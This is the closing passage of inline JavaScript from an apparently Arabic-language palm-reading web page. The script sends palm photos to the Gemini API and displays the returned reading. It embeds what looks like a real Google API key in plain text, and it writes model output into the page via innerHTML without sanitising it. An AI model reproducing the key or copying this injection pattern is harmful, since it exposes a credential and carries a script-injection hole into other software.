                const mimeTypeRear = activeRearPalmImageBase64.split(',')[0].split(':')[1].split(';')[0];
                const base64DataRear = activeRearPalmImageBase64.split(',')[1];
                contents[0].parts.push({
                    inlineData: {
                        mimeType: mimeTypeRear,
                        data: base64DataRear
                    }
                });

                const payload = {
                    contents: contents,
                    generationConfig: {
                        temperature: 0.8,
                        maxOutputTokens: 500
                    }
                };

                const apiKey = "AIzaSyDfUkLknP8pzk_0bn4Kii2bS14Y35hLJfw"; // API key is provided by Canvas runtime
                const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${apiKey}`;

                const response = await fetch(apiUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                const result = await response.json();

                if (result.candidates && result.candidates.length > 0 &&
                    result.candidates[0].content && result.candidates[0].content.parts &&
                    result.candidates[0].content.parts.length > 0) {
                    const reading = result.candidates[0].content.parts[0].text;
                    readingTextPalm.innerHTML = reading.replace(/\n/g, '<br>');
                    readingResultsPalm.classList.remove('hidden');
                    showMessage('تمت قراءة كفك بنجاح!', 'success');
                } else {
                    showMessage('عذرًا، لم أتمكن من توليد قراءة كف. يرجى المحاولة مرة أخرى.', 'error');
                    console.error('API response structure unexpected:', result);
                }

            } catch (error) {
                console.error('Error generating palm reading:', error);
                showMessage('حدث خطأ أثناء تحليل الكف. يرجى التأكد من اتصالك بالإنترنت والمحاولة مرة أخرى.', 'error');
            } finally {
                // Re-enable button and hide loading indicator
                analyzeButtonPalm.disabled = false;
                analyzeButtonPalm.classList.remove('opacity-50', 'cursor-not-allowed');
                loadingIndicatorPalm.classList.add('hidden');
            }
        }

        // --- Event Listeners ---

        // Navigation buttons
        document.querySelector('header nav ul').addEventListener('click', (e) => {
            if (e.target.tagName === 'A') {
                const sectionId = e.target.getAttribute('onclick').match(/'(.*?)'/)[1];
                showSection(sectionId);
            }
        });

        // Palm Reading Mode Selection
        uploadModeButton.addEventListener('click', () => showPalmReadingMode('upload'));
        cameraModeButton.addEventListener('click', () => showPalmReadingMode('camera'));

        // Image Upload
        palmImageUploadPalm.addEventListener('change', handleImageUpload);

        // Camera Controls
        capturePhotoButton.addEventListener('click', capturePhoto);

        // Analyze Button
        analyzeButtonPalm.addEventListener('click', generatePalmReading);

        // Initial load: show home section
        window.onload = () => {
            showSection('home');
        };
    </script>
</body>
</html>
